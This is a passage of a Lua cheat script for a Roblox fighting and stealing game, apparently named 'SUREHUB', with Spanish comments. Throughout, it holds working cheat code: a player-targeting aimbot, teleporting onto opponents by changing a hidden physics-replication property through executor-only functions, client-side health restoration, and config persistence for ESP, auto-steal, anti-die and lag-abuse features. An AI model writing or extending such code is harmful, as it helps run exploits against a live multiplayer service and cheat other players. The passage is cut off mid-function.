        if autoRightSetVisual then autoRightSetVisual(false) end
        if mobSetAutoRight then mobSetAutoRight(false) end
        stopAutoRight()
    end
    if not autoBatEnabled then
        autoBatEnabled = true
        if autoBatSetVisual then autoBatSetVisual(true) end
        if mobSetAutoBat then mobSetAutoBat(true) end
        startAimbotAdapt()
        saveNow()
    end
end

-- ====== BYPASS AIMBOT (MODO 1) y TP BAT (MODO 2) ======
local BAT_V2_FOLLOW_DIST = 1.0
local BAT_V2_HEIGHT_OFFSET = 1.5
local BAT_V2_VERTICAL_OFFSET = 0.0
local BAT_V2_HIT_DIST = 4.5
local bypassHittingCooldown = false
local bypassConn = nil

local function getClosestPlayerV2()
    local char = LP.Character
    if not char then return nil, math.huge end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil, math.huge end
    local closest, bestDist = nil, math.huge
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local tr = p.Character:FindFirstChild("HumanoidRootPart")
            local ph = p.Character:FindFirstChildOfClass("Humanoid")
            if tr and ph and ph.Health > 0 then
                local d = (hrp.Position - tr.Position).Magnitude
                if d < bestDist then bestDist = d; closest = p end
            end
        end
    end
    return closest, bestDist
end

local function tryHitBatV2()
    if bypassHittingCooldown then return end
    bypassHittingCooldown = true
    pcall(function()
        local char = LP.Character
        if not char then return end
        local currentTool = char:FindFirstChildOfClass("Tool")
        if currentTool and not isBatTool(currentTool) then
            bypassHittingCooldown = false
            return
        end
        local bat = findBat()
        if bat then
            if bat.Parent ~= char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:EquipTool(bat) end) end
            end
            local remote = bat:FindFirstChildOfClass("RemoteEvent")
            if remote then pcall(function() remote:FireServer() end) else pcall(function() bat:Activate() end) end
        end
    end)
    task.delay(BAT_V2_SWING_COOLDOWN, function() bypassHittingCooldown = false end)
    task.delay(0.2, function()
        if bypassHittingCooldown then bypassHittingCooldown = false end
    end)
end

local function startBypassAimbot()
    if bypassConn then return end
    bypassConn = RunService.Heartbeat:Connect(function()
        if not bypassToggled then return end
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local state = hum:GetState()
        if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
            return
        end
        if not char:FindFirstChildOfClass("Tool") then
            local bat = findBat()
            if bat then pcall(function() hum:EquipTool(bat) end) end
        end
        local target, dist = getClosestPlayerV2()
        if target and target.Character then
            local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                if bypassMode == 1 then
                    local targetVel = targetRoot.AssemblyLinearVelocity
                    local moveDir = targetVel.Magnitude > 0.1 and targetVel.Unit or targetRoot.CFrame.LookVector
                    local offset = moveDir * BAT_V2_FOLLOW_DIST + Vector3.new(0, BAT_V2_HEIGHT_OFFSET + BAT_V2_VERTICAL_OFFSET, 0)
                    local desiredPos = targetRoot.Position + offset
                    local toTarget = desiredPos - root.Position
                    if toTarget.Magnitude > 0.5 then
                        local moveVec = toTarget.Unit * BYPASS_AIMBOT_SPEED
                        root.AssemblyLinearVelocity = Vector3.new(moveVec.X, moveVec.Y, moveVec.Z)
                    else
                        root.AssemblyLinearVelocity = root.AssemblyLinearVelocity * 0.95
                        if root.AssemblyLinearVelocity.Magnitude < 1 then root.AssemblyLinearVelocity = Vector3.zero end
                    end
                    local distToTarget = (root.Position - targetRoot.Position).Magnitude
                    if distToTarget <= BAT_V2_HIT_DIST then
                        tryHitBatV2()
                    end
                else
                    local tr = targetRoot
                    if tr then
                        pcall(function()
                            sethiddenproperty(root, "PhysicsRepRootPart", tr)
                        end)
                        local targetPos = tr.Position + Vector3.new(0, 0.9, 0)
                        if (root.Position - targetPos).Magnitude > 8 then
                            root.CFrame = CFrame.new(targetPos)
                        end
                        local cam = workspace.CurrentCamera
                        if cam then
                            cam.CFrame = CFrame.new(cam.CFrame.Position, tr.Position)
                        end
                        tryHitBatV2()
                    end
                end
            end
        else
            if bypassMode == 1 then
                root.AssemblyLinearVelocity = root.AssemblyLinearVelocity * 0.9
                if root.AssemblyLinearVelocity.Magnitude < 1 then root.AssemblyLinearVelocity = Vector3.zero end
            end
        end
    end)
end

local function stopBypassAimbot()
    if bypassConn then
        bypassConn:Disconnect()
        bypassConn = nil
    end
    local c = LP.Character
    local root = c and c:FindFirstChild("HumanoidRootPart")
    local hum = c and c:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.AutoRotate = true
        hum.PlatformStand = false
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
    end
    if root then
        root.AssemblyLinearVelocity = Vector3.new(0, -0.1, 0)
        root.AssemblyAngularVelocity = Vector3.zero
        pcall(function() sethiddenproperty(root, "PhysicsRepRootPart", nil) end)
    end
    bypassHittingCooldown = false
    lastMoveDir = Vector3.zero
end

local bypassSetVisual = nil
local tpBatSetVisual = nil

local function toggleBypass(state)
    if state == nil then
        state = not bypassToggled
    end
    bypassToggled = state
    if bypassToggled then
        if autoBatEnabled then
            disableAutoBat()
            if autoBatSetVisual then autoBatSetVisual(false) end
            if mobSetAutoBat then mobSetAutoBat(false) end
        end
        if autoLeftEnabled then
            autoLeftEnabled = false
            if autoLeftSetVisual then autoLeftSetVisual(false) end
            if mobSetAutoLeft then mobSetAutoLeft(false) end
            stopAutoLeft()
        end
        if autoRightEnabled then
            autoRightEnabled = false
            if autoRightSetVisual then autoRightSetVisual(false) end
            if mobSetAutoRight then mobSetAutoRight(false) end
            stopAutoRight()
        end
        startBypassAimbot()
    else
        stopBypassAimbot()
    end
    if bypassFloatingButton then
        local btnFrame = bypassFloatingButton:FindFirstChild("Frame")
        if btnFrame then
            local label = btnFrame:FindFirstChild("TextLabel")
            if bypassToggled and bypassMode == 1 then
                btnFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                if label then label.TextColor3 = Color3.fromRGB(100, 180, 255) end
            else
                btnFrame.BackgroundColor3 = Color3.fromRGB(0, 20, 80)
                if label then label.TextColor3 = Color3.fromRGB(0, 0, 0) end
            end
        end
    end
    if bypassSetVisual then bypassSetVisual(bypassToggled and bypassMode == 1) end
    if tpBatSetVisual then tpBatSetVisual(bypassToggled and bypassMode == 2) end
    if mobSetBatTP then mobSetBatTP(bypassToggled and bypassMode == 2) end
    saveNow()
end

local function toggleTPBat(state)
    if state == nil then
        state = not (bypassToggled and bypassMode == 2)
    end
    if state then
        if bypassToggled and bypassMode == 1 then
            bypassMode = 2
            if bypassSetVisual then bypassSetVisual(false) end
            if tpBatSetVisual then tpBatSetVisual(true) end
            if bypassFloatingButton then
                local btnFrame = bypassFloatingButton:FindFirstChild("Frame")
                if btnFrame then
                    local label = btnFrame:FindFirstChild("TextLabel")
                    btnFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    if label then label.TextColor3 = Color3.fromRGB(100, 180, 255) end
                end
            end
            if mobSetBatTP then mobSetBatTP(true) end
            saveNow()
            return
        elseif not bypassToggled then
            bypassMode = 2
            toggleBypass(true)
            return
        end
    else
        if bypassToggled and bypassMode == 2 then
            toggleBypass(false)
        end
    end
end

-- ====== TP DOWN ======
local autoTPDownEnabled = false
local autoTPDownConn = nil
local autoTPDownThreshold = 20

local function applyTPDown(sinkAmount, forwardForce)
    local char = LP.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    local state = hum:GetState()
    if state == Enum.HumanoidStateType.Physics or
       state == Enum.HumanoidStateType.Ragdoll or
       state == Enum.HumanoidStateType.FallingDown then
        return
    end

    local oldHealth = hum.Health

    local rayParams = RaycastParams.new()
    rayParams.FilterDescendantsInstances = {char}
    rayParams.FilterType = Enum.RaycastFilterType.Exclude
    local ray = workspace:Raycast(hrp.Position, Vector3.new(0, -500, 0), rayParams)
    if not ray then return end

    local groundY = ray.Position.Y
    local offset = (hum.HipHeight or 2) + (hrp.Size.Y / 2) - sinkAmount
    local targetY = groundY + offset

    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
    hrp.CFrame = CFrame.new(hrp.Position.X, targetY, hrp.Position.Z)

    RunService.Heartbeat:Wait()

    if forwardForce > 0 then
        local forwardDir = hrp.CFrame.LookVector
        hrp.AssemblyLinearVelocity = Vector3.new(forwardDir.X * forwardForce, 0, forwardDir.Z * forwardForce)
    end

    if hum and hum.Health > 0 then
        hum:ChangeState(Enum.HumanoidStateType.Running)
    end

    task.wait(0.05)
    if hum and hum.Health < oldHealth then
        hum.Health = oldHealth
    end
end

local function executeTPDown()
    applyTPDown(0.8, 48)
end

local function startAutoTPDown()
    if autoTPDownConn then autoTPDownConn:Disconnect() end
    autoTPDownConn = RunService.RenderStepped:Connect(function()
        if not autoTPDownEnabled then return end
        if autoLeftEnabled or autoRightEnabled or autoBatEnabled or bypassToggled then return end
        local char = LP.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local state = hum:GetState()
        if state == Enum.HumanoidStateType.Physics or
           state == Enum.HumanoidStateType.Ragdoll or
           state == Enum.HumanoidStateType.FallingDown then
            return
        end
        if hrp.Position.Y >= autoTPDownThreshold then
            executeTPDown()
        end
    end)
end

local function stopAutoTPDown()
    if autoTPDownConn then autoTPDownConn:Disconnect(); autoTPDownConn = nil end
end

local modeValLbl = nil
local function refreshSpeedModeLabel()
    if modeValLbl then
        if laggerToggled then
            modeValLbl.Text = "Lagger Mode"
        elseif speedMode then
            modeValLbl.Text = "Carry Mode"
        else
            modeValLbl.Text = "Normal"
        end
    end
end

function toggleLaggerCycle()
    if speedMode then
        speedMode = false
        if mobSetCarry then mobSetCarry(false) end
    end
    if not laggerToggled then
        laggerToggled = true
        laggerLevel = 1
    else
        if laggerLevel == 1 then
            laggerLevel = 2
        else
            laggerLevel = 1
        end
    end
    refreshSpeedModeLabel()
    if mobSetLagger then mobSetLagger(laggerToggled) end
    resetMovementState()
    saveNow()
end

local function toggleCarryMode()
    if laggerToggled then
        laggerToggled = false
        laggerLevel = 1
        speedMode = true
    else
        speedMode = not speedMode
        if speedMode then
            laggerToggled = false
            laggerLevel = 1
        end
    end
    refreshSpeedModeLabel()
    if mobSetCarry then mobSetCarry(speedMode) end
    if mobSetLagger then mobSetLagger(laggerToggled) end
    resetMovementState()
    saveNow()
end

local function toggleLockUI(state)
    if state == nil then
        uiLocked = not uiLocked
    else
        uiLocked = state
    end
    if setLockUIVisual then setLockUIVisual(uiLocked) end
    saveNow()
end

-- ====== FUNCIÓN PARA OBTENER LA POSICIÓN JUSTO A LA IZQUIERDA DE DROP BR ======
local function getLeftOfDropBR()
    local col0X = - (MOBILE_BTN_W * MOBILE_COLS + MOBILE_GAP * (MOBILE_COLS - 1)) - 10
    return col0X - (MOBILE_BTN_W + MOBILE_GAP)
end

-- ====== FUNCIÓN PARA RESTAURAR POSICIONES FLOTANTES ======
local function resetFloatingPositions()
    local names = {"DropBR","AutoLeft","AutoBat","AutoRight","TpDown","Carry","Lagger","BatTP"}
    for i, name in ipairs(names) do
        local col = (i-1) % MOBILE_COLS
        local row = math.floor((i-1) / MOBILE_COLS)
        local xOff = - (MOBILE_BTN_W * MOBILE_COLS + MOBILE_GAP * (MOBILE_COLS-1)) - 10 + col * (MOBILE_BTN_W + MOBILE_GAP)
        local yOff = row * (MOBILE_BTN_H + MOBILE_GAP + MOBILE_ROW_GAP)
        if name == "BatTP" then
            xOff = getLeftOfDropBR()
            yOff = MOBILE_BTN_H + MOBILE_GAP
        end
        mobileButtonPositions[name] = {XScale = 1, XOffset = xOff, YScale = 0, YOffset = yOff}
        local frame = mobileButtonFrames[name]
        if frame then
            frame.Position = UDim2.new(1, xOff, 0, yOff)
        end
    end
    if instaResetFloatingButton and instaResetFloatingButton:FindFirstChild("Frame") then
        local btnFrame = instaResetFloatingButton:FindFirstChild("Frame")
        local leftX = getLeftOfDropBR()
        btnFrame.Position = UDim2.new(1, leftX, 0, 0)
        instaResetFloatingPos = nil
    end
    if bypassFloatingButton and bypassFloatingButton:FindFirstChild("Frame") then
        local btnFrame = bypassFloatingButton:FindFirstChild("Frame")
        local leftX = getLeftOfDropBR()
        local yOff = (MOBILE_BTN_H + MOBILE_GAP) * 2
        btnFrame.Position = UDim2.new(1, leftX, 0, yOff)
        bypassFloatingPos = nil
    end
    pcall(saveAllSettings)
end

-- ============================================================
-- 🔥 CONFIGURACIÓN Y AUTO-SAVE
-- ============================================================
local CONFIG_FILE = "SUREHUB.json"
local lastSavedJSON = nil

local function buildConfigTable()
    local config = {
        normalSpeed = NS,
        carrySpeed = CS,
        laggerSpeed1 = LAGGER_SPEED_1,
        laggerSpeed2 = LAGGER_SPEED_2,
        autoLaggerSpeed = LAGGER_SPEED_1,  -- se usará para la velocidad manual de lagger
        autoTPHeight = autoTPHeight,
        antiRagdoll = antiRagdollEnabled,
        jumpEnabled = jumpEnabled,
        jumpMode = jumpMode,
        medusaCounter = medusaCounterEnabled,
        batCounter = batCounterEnabled,
        laggerToggled = laggerToggled,
        laggerLevel = laggerLevel,
        carryMode = speedMode,
        autoBat = autoBatEnabled,
        autoLeft = autoLeftEnabled,
        autoRight = autoRightEnabled,
        unwalk = unwalkEnabled,
        antiLag = antiLagEnabled,
        autoTPDownEnabled = autoTPDownEnabled,
        autoTPDownThreshold = autoTPDownThreshold,
        lockUI = uiLocked,
        batAimbotSpeed = BAT_AIMBOT_SPEED,
        bypassToggled = bypassToggled,
        bypassSpeed = BYPASS_AIMBOT_SPEED,
        bypassMode = bypassMode,
        medusaAutoReset = medusaAutoResetEnabled,
        stretchEnabled = stretchEnabled,
        stretchFOV = stretchFOV,
        galaxySky = galaxySkyEnabled,
        antiBatSpin = antiBatSpinEnabled,
        ragdollTimerEnabled = ragdollTimerEnabled,
        espEnabled = espEnabled,
        antiDie = antiDieEnabled,
        meleeAimbotEnabled = meleeAimbotEnabled,
        dropBrainrotKey = {kb = KB.DropBrainrot.kb and KB.DropBrainrot.kb.Name, gp = KB.DropBrainrot.gp and KB.DropBrainrot.gp.Name},
        autoLeftKey = {kb = KB.AutoLeft.kb and KB.AutoLeft.kb.Name, gp = KB.AutoLeft.gp and KB.AutoLeft.gp.Name},
        autoRightKey = {kb = KB.AutoRight.kb and KB.AutoRight.kb.Name, gp = KB.AutoRight.gp and KB.AutoRight.gp.Name},
        autoBatKey = {kb = KB.AutoBat.kb and KB.AutoBat.kb.Name, gp = KB.AutoBat.gp and KB.AutoBat.gp.Name},
        tpFloorKey = {kb = KB.TPFloor.kb and KB.TPFloor.kb.Name, gp = KB.TPFloor.gp and KB.TPFloor.gp.Name},
        carryToggleKey = {kb = KB.CarryToggle.kb and KB.CarryToggle.kb.Name, gp = KB.CarryToggle.gp and KB.CarryToggle.gp.Name},
        laggerModeKey = {kb = KB.LaggerMode.kb and KB.LaggerMode.kb.Name, gp = KB.LaggerMode.gp and KB.LaggerMode.gp.Name},
        autoTPDownKey = {kb = KB.AutoTPDown.kb and KB.AutoTPDown.kb.Name, gp = KB.AutoTPDown.gp and KB.AutoTPDown.gp.Name},
        instaResetKey = {kb = KB.InstaReset.kb and KB.InstaReset.kb.Name, gp = KB.InstaReset.gp and KB.InstaReset.gp.Name},
        jumpModeKey = {kb = KB.JumpMode.kb and KB.JumpMode.kb.Name, gp = KB.JumpMode.gp and KB.JumpMode.gp.Name},
        bypassKey = {kb = KB.Bypass.kb and KB.Bypass.kb.Name, gp = KB.Bypass.gp and KB.Bypass.gp.Name},
        tpBatKey = {kb = KB.TPBat.kb and KB.TPBat.kb.Name, gp = KB.TPBat.gp and KB.TPBat.gp.Name},
        mobileButtonPositions = mobileButtonPositions,
        instaResetFloatingPos = instaResetFloatingPos,
        bypassFloatingPos = bypassFloatingPos,
        autoStealEnabled = Steal.AutoStealEnabled,
        stealRadius = Steal.StealRadius,
        halfFireRange = Steal.HalfFireRange,
        halfHoldMin = Steal.HalfHoldMin,
        halfHoldMax = Steal.HalfHoldMax,
        halfEntryDelay = Steal.HalfEntryDelay,
        musicStates = musicStates,
    }
    return config
end

local function saveAllSettings()
    local config = buildConfigTable()
    local json = HS:JSONEncode(config)
    if json == lastSavedJSON then
        return true
    end
    local success, err = pcall(function()
        writefile(CONFIG_FILE, json)
    end)
    if success then
        lastSavedJSON = json
    end
    return success
end

local function loadAllSettings()
    if not isfile or not isfile(CONFIG_FILE) then return false end
    local success, data = pcall(function()
        return HS:JSONDecode(readfile(CONFIG_FILE))
    end)
    if not success or not data then return false end
    if data.normalSpeed then NS = data.normalSpeed end
    if data.carrySpeed then CS = data.carrySpeed end
    if data.laggerSpeed1 then LAGGER_SPEED_1 = data.laggerSpeed1 end
    if data.laggerSpeed2 then LAGGER_SPEED_2 = data.laggerSpeed2 end
    -- autoLaggerSpeed ya no se usa
    if data.autoTPHeight then autoTPHeight = data.autoTPHeight end
    if data.autoTPDownEnabled ~= nil then autoTPDownEnabled = data.autoTPDownEnabled end
    if data.autoTPDownThreshold then autoTPDownThreshold = data.autoTPDownThreshold end
    if data.lockUI ~= nil then uiLocked = data.lockUI end
    if data.autoLeft ~= nil then autoLeftEnabled = data.autoLeft end
    if data.autoRight ~= nil then autoRightEnabled = data.autoRight end
    if data.antiRagdoll then antiRagdollEnabled = data.antiRagdoll end
    if data.jumpEnabled ~= nil then jumpEnabled = data.jumpEnabled end
    if data.jumpMode then jumpMode = data.jumpMode end
    if data.medusaCounter then medusaCounterEnabled = data.medusaCounter end
    if data.batCounter then batCounterEnabled = data.batCounter end
    if data.autoBat then autoBatEnabled = data.autoBat end
    if data.unwalk then unwalkEnabled = data.unwalk end
    if data.antiLag then antiLagEnabled = data.antiLag end
    if data.laggerToggled then
        laggerToggled = true
        speedMode = false
        laggerLevel = data.laggerLevel or 1
    elseif data.carryMode then
        speedMode = true
        laggerToggled = false
    else
        speedMode = false
        laggerToggled = false
        laggerLevel = 1
    end
    if data.medusaAutoReset ~= nil then
        medusaAutoResetEnabled = data.medusaAutoReset
        if medusaAutoResetEnabled and medusaCounterEnabled then
            medusaCounterEnabled = false
        end
    end
    if data.antiBatSpin ~= nil then
        antiBatSpinEnabled = data.antiBatSpin
    end
    if data.ragdollTimerEnabled ~= nil then
        ragdollTimerEnabled = data.ragdollTimerEnabled
    end
    if data.espEnabled ~= nil then
        espEnabled = data.espEnabled
    end
    if data.antiDie ~= nil then
        antiDieEnabled = data.antiDie
    end
    if data.meleeAimbotEnabled ~= nil then
        meleeAimbotEnabled = data.meleeAimbotEnabled
    else
        meleeAimbotEnabled = true
    end
    if data.instaResetKey then
        local ik = data.instaResetKey
        if ik.kb and Enum.KeyCode[ik.kb] then
            KB.InstaReset.kb = Enum.KeyCode[ik.kb]
            KB.InstaReset.gp = nil
        end
        if ik.gp and Enum.KeyCode[ik.gp] then
            KB.InstaReset.gp = Enum.KeyCode[ik.gp]
            KB.InstaReset.kb = nil
        end
    end
    if data.jumpModeKey then
        local jk = data.jumpModeKey
        if jk.kb and Enum.KeyCode[jk.kb] then
            KB.JumpMode.kb = Enum.KeyCode[jk.kb]
            KB.JumpMode.gp = nil
        end
        if jk.gp and Enum.KeyCode[jk.gp] then
            KB.JumpMode.gp = Enum.KeyCode[jk.gp]
            KB.JumpMode.kb = nil
        end
    end
    if data.bypassKey then
        local bk = data.bypassKey
        if bk.kb and Enum.KeyCode[bk.kb] then
            KB.Bypass.kb = Enum.KeyCode[bk.kb]
            KB.Bypass.gp = nil
        end
        if bk.gp and Enum.KeyCode[bk.gp] then
            KB.Bypass.gp = Enum.KeyCode[bk.gp]
            KB.Bypass.kb = nil
        end
    end
    if data.tpBatKey then
        local tk = data.tpBatKey
        if tk.kb and Enum.KeyCode[tk.kb] then
            KB.TPBat.kb = Enum.KeyCode[tk.kb]
            KB.TPBat.gp = nil
        end
        if tk.gp and Enum.KeyCode[tk.gp] then
            KB.TPBat.gp = Enum.KeyCode[tk.gp]
            KB.TPBat.kb = nil
        end
    end
    if data.instaResetFloatingPos then
        instaResetFloatingPos = data.instaResetFloatingPos
    end
    if data.bypassFloatingPos then
        bypassFloatingPos = data.bypassFloatingPos
    end
    if data.mobileButtonPositions then
        for name, pos in pairs(data.mobileButtonPositions) do
            mobileButtonPositions[name] = pos
        end
    end
    if data.batAimbotSpeed then
        BAT_AIMBOT_SPEED = data.batAimbotSpeed
    end
    if data.bypassSpeed then
        BYPASS_AIMBOT_SPEED = data.bypassSpeed
        if bypassSpeedBox then bypassSpeedBox.Text = tostring(BYPASS_AIMBOT_SPEED) end
    end
    bypassToggled = data.bypassToggled or false
    if data.bypassMode then
        bypassMode = data.bypassMode
    end
    if data.stretchEnabled ~= nil then
        stretchEnabled = data.stretchEnabled
    end
    if data.stretchFOV then
        stretchFOV = data.stretchFOV
    end
    if data.galaxySky ~= nil then
        galaxySkyEnabled = data.galaxySky
    end
    if data.autoStealEnabled ~= nil then
        Steal.AutoStealEnabled = data.autoStealEnabled
        if setAutoStealVisual then setAutoStealVisual(Steal.AutoStealEnabled) end
        if Steal.AutoStealEnabled then
            startAutoSteal()
            if _G.updateAutoStealUI then _G.updateAutoStealUI() end
        else
            stopAutoSteal()
            if _G.updateAutoStealUI then _G.updateAutoStealUI() end
        end
    end
    if data.stealRadius then Steal.StealRadius = data.stealRadius end
    if data.halfFireRange then Steal.HalfFireRange = data.halfFireRange end
    if data.halfHoldMin then Steal.HalfHoldMin = data.halfHoldMin end
    if data.halfHoldMax then Steal.HalfHoldMax = data.halfHoldMax end
    if data.halfEntryDelay then Steal.HalfEntryDelay = data.halfEntryDelay end

    -- Cargar musicStates
    if data.musicStates then
        for title, state in pairs(data.musicStates) do
            musicStates[title] = state
        end
    end

    local function loadKey(kbData, target)
        if kbData and kbData.kb and Enum.KeyCode[kbData.kb] then
            target.kb = Enum.KeyCode[kbData.kb]
            target.gp = nil
        end
        if kbData and kbData.gp and Enum.KeyCode[kbData.gp] then
            target.gp = Enum.KeyCode[kbData.gp]
            target.kb = nil
        end
    end
    loadKey(data.dropBrainrotKey, KB.DropBrainrot)
    loadKey(data.autoLeftKey, KB.AutoLeft)
    loadKey(data.autoRightKey, KB.AutoRight)
    loadKey(data.autoBatKey, KB.AutoBat)
    loadKey(data.tpFloorKey, KB.TPFloor)
    loadKey(data.carryToggleKey, KB.CarryToggle)
    loadKey(data.laggerModeKey, KB.LaggerMode)
    loadKey(data.autoTPDownKey, KB.AutoTPDown)
    refreshSpeedModeLabel()
    lastSavedJSON = HS:JSONEncode(buildConfigTable())
    return true
end

local function resetToDefaults()
    stopAllBackgroundTasks()
    NS = 60
    CS = 30
    LAGGER_SPEED_1 = 15
    LAGGER_SPEED_2 = 10
    autoTPHeight = 20
    autoTPDownThreshold = 20
    speedMode = false
    laggerToggled = false
    laggerLevel = 1
    antiRagdollEnabled = false
    jumpEnabled = false
    jumpMode = 1
    medusaCounterEnabled = false
    batCounterEnabled = false
    autoBatEnabled = false
    autoLeftEnabled = false
    autoRightEnabled = false
    unwalkEnabled = false
    antiLagEnabled = false
    autoTPDownEnabled = false
    uiLocked = false
    BAT_AIMBOT_SPEED = 58
    BYPASS_AIMBOT_SPEED = 60
    bypassToggled = false
    bypassMode = 1
    medusaAutoResetEnabled = false
    stretchEnabled = false
    stretchFOV = 110
    galaxySkyEnabled = false
    antiBatSpinEnabled = false
    ragdollTimerEnabled = false
    espEnabled = false
    antiDieEnabled = false
    meleeAimbotEnabled = true
    Steal.AutoStealEnabled = false
    Steal.StealRadius = 55
    Steal.HalfFireRange = 10
    Steal.HalfHoldMin = 1.3
    Steal.HalfHoldMax = 2.6
    Steal.HalfEntryDelay = 0.3
    musicStates = {}
    stopAutoSteal()
    if _G.updateAutoStealUI then _G.updateAutoStealUI() end
    if normalBox then normalBox.Text = tostring(NS) end
    if carryBox then carryBox.Text = tostring(CS) end
    if autoLaggerBox then autoLaggerBox.Text = tostring(LAGGER_SPEED_1) end
    if autoTPHeightBox then autoTPHeightBox.Text = tostring(autoTPHeight) end
    if bypassSpeedBox then bypassSpeedBox.Text = tostring(BYPASS_AIMBOT_SPEED) end
    if autoBatSetVisual then autoBatSetVisual(false) end
    if autoLeftSetVisual then autoLeftSetVisual(false) end
    if autoRightSetVisual then autoRightSetVisual(false) end
    if setMedusaVisual then setMedusaVisual(false) end
    if setMedusaAutoResetVisual then setMedusaAutoResetVisual(false) end
    if setAntiRagVisual then setAntiRagVisual(false) end
    if setJumpVisual then setJumpVisual(false) end
    if setUnwalkVisual then setUnwalkVisual(false) end
    if setAntiLagVisual then setAntiLagVisual(false) end
    if setAutoTPDownVisual then setAutoTPDownVisual(false) end
    if setLockUIVisual then setLockUIVisual(false) end
    if bypassSetVisual then bypassSetVisual(false) end
    if tpBatSetVisual then tpBatSetVisual(false) end
    if setGalaxySkyVisual then setGalaxySkyVisual(false) end
    if _G.stretchToggleSetter then _G.stretchToggleSetter(false) end
    if antiBatSpinVisual then antiBatSpinVisual(false) end
    if setRagdollTimerVisual then setRagdollTimerVisual(false) end
    if espToggleVisual then espToggleVisual(false) end
    if antiDieToggleVisual then antiDieToggleVisual(false) end
    if meleeToggleVisual then meleeToggleVisual(true) end
    if mobSetAutoBat then mobSetAutoBat(false) end
    if mobSetAutoLeft then mobSetAutoLeft(false) end
    if mobSetAutoRight then mobSetAutoRight(false) end
    if mobSetDropBR then mobSetDropBR(false) end
    if mobSetTpDown then mobSetTpDown(false) end
    if mobSetCarry then mobSetCarry(false) end
    if mobSetLagger then mobSetLagger(false) end
    if mobSetBatTP then mobSetBatTP(false) end
    if setAutoStealVisual then setAutoStealVisual(false) end
    if modeSelectBtn then
        modeSelectBtn.Text = jumpMode == 1 and "Tap Tap" or "Hold"
    end
    refreshSpeedModeLabel()
    lastSavedJSON = HS:JSONEncode(buildConfigTable())
    resetFloatingPositions()
    disableGalaxySky()
    stopAntiBatSpin()
    stopRagdollTimer()
    disableESP()
    stopAntiDie()
    stopMeleeAimbot()
    -- Resetear música
    for _, snd in ipairs(musicSounds) do
        pcall(function() snd:Stop(); snd:Destroy() end)
    end
    musicSounds = {}
    for title, setter in pairs(musicToggleSetters) do
        setter(false)
    end
end

local function deleteAllSettings()
    local success = false
    if isfile and isfile(CONFIG_FILE) then
        success = pcall(function() delfile(CONFIG_FILE); return true end)
    end
    resetToDefaults()
    return success
end

-- ====== ACTUALIZACIÓN DE LA GUI TRAS CARGAR CONFIGURACIÓN ======
local function updateUIFromLoaded()
    task.wait()
    if normalBox then normalBox.Text=tostring(NS) end
    if carryBox then carryBox.Text=tostring(CS) end
    if autoLaggerBox then autoLaggerBox.Text=tostring(LAGGER_SPEED_1) end
    if autoTPHeightBox then autoTPHeightBox.Text=tostring(autoTPHeight) end
    if bypassSpeedBox then bypassSpeedBox.Text = tostring(BYPASS_AIMBOT_SPEED) end
    refreshSpeedModeLabel()
    if uiLocked and setLockUIVisual then setLockUIVisual(true) end

    if antiRagdollEnabled and setAntiRagVisual then
        setAntiRagVisual(true)
        startAntiRagdoll()
    elseif setAntiRagVisual then
        setAntiRagVisual(false)
        stopAntiRagdoll()
    end

    if jumpEnabled then
        if setJumpVisual then setJumpVisual(true) end
        startJumpMode()
    else
        if setJumpVisual then setJumpVisual(false) end
        stopJumpMode()
    end

    if medusaCounterEnabled then
        if setMedusaVisual then setMedusaVisual(true) end
        if LP.Character then setupMedusa(LP.Character) end
        if setMedusaAutoResetVisual then setMedusaAutoResetVisual(false) end
        stopMedusaAutoReset()
    elseif medusaAutoResetEnabled then
        if setMedusaAutoResetVisual then setMedusaAutoResetVisual(true) end
        if LP.Character then setupMedusaAutoReset(LP.Character) end
        if setMedusaVisual then setMedusaVisual(false) end
        stopMedusaCounter()
    else
        stopMedusaCounter()
        stopMedusaAutoReset()
        if setMedusaVisual then setMedusaVisual(false) end
        if setMedusaAutoResetVisual then setMedusaAutoResetVisual(false) end
    end

    if batCounterEnabled then
        startBatCounter()
    else
        stopBatCounter()
    end

    if autoTPDownEnabled then
        if setAutoTPDownVisual then setAutoTPDownVisual(true) end
        startAutoTPDown()
    else
        if setAutoTPDownVisual then setAutoTPDownVisual(false) end
        stopAutoTPDown()
    end

    if autoBatEnabled then
        if autoBatSetVisual then autoBatSetVisual(true) end
        enableAutoBat()
    else
        if autoBatSetVisual then autoBatSetVisual(false) end
        disableAutoBat()
    end

    if autoLeftEnabled then
        if autoLeftSetVisual then autoLeftSetVisual(true) end
        startAutoLeft()
    else
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        stopAutoLeft()
    end

    if autoRightEnabled then
        if autoRightSetVisual then autoRightSetVisual(true) end
        startAutoRight()
    else
        if autoRightSetVisual then autoRightSetVisual(false) end
        stopAutoRight()
    end

    if unwalkEnabled then
        if _G.duelUnwalkSetter then _G.duelUnwalkSetter(true) end
        task.spawn(function() task.wait(0.5); startUnwalk() end)
    else
        if _G.duelUnwalkSetter then _G.duelUnwalkSetter(false) end
        stopUnwalk()
    end

    if antiLagEnabled then
        if setAntiLagVisual then setAntiLagVisual(true) end
        enableAntiLag()
    else
        if setAntiLagVisual then setAntiLagVisual(false) end
        disableAntiLag()
    end

    if stretchEnabled then
        enableStretch()
        if _G.stretchToggleSetter then _G.stretchToggleSetter(true) end
    else
        if _G.stretchToggleSetter then _G.stretchToggleSetter(false) end
    end

    if _G.fovButtons then
        for _, btn in ipairs(_G.fovButtons) do
            local val = tonumber(btn.Text)
            if val == stretchFOV then
                btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
